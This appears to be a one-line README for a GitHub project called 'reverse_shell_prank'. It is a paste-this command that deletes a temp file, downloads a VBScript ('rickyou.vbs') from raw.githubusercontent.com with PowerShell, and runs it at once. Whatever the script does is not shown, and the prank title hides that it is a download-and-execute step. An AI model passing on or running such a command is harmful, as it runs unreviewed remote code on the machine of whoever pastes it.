# reverse_shell_prank
del %tmp%/audio.vbs && powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/wwwqr-000/reverse_shell_prank/main/rickyou.vbs' -OutFile %tmp%/audio.vbs" && start %tmp%/audio.vbs
